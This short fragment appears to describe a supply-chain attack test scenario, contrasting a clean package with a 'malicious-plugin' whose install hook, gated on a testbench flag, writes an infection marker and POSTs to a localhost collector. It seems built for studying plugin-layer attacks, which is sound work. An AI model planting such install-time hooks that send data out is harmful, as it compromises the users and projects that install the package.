      "text": "LEGIT: packages/target-lib\ntarget-lib clean package · ✓ No install hooks · ✓ No TESTBENCH gated network · plugin layer is the attack surface\nMAL: plugins/malicious-plugin/index.js\nfunction installHook({ projectRoot }) { ·   if (TESTBENCH_MODE !== 'enabled') return ·   write .infected-by-plugin marker ·   http.request POST localhost:3018/collect · }\nedge: plugin wraps install",
